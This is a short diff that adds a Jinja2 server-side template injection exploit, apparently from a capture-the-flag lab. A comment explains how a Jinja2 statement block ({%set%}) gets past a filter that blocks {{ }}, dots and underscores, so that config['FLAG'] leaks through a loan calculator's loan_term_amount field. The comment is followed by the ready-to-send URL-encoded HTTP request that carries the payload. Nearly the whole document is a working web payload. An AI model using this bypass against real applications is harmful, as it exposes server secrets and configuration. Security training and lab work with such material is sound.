@@ -1,0 +1,5 @@
+# SSTI bypass via Jinja2 statement block {%set%}. Filter blocks {{ }} . _ but not {%...%}. payload: {%set term=config['FLAG']%} overrides the 'term' template variable which is output without float conversion in loan_term_amount field. Flag appears in loan_term_amount JSON key.
+
+GET /total_loan_payments?principal=%7B%25+set+term+%3D+config%5B%27FLAG%27%5D+%25%7D&payment=212&term=60 HTTP/1.1
+Host: 172.17.0.1:52825
+Cookie: session=eyJ1c2VyX2lkIjoxfQ.SESSION_TOKEN
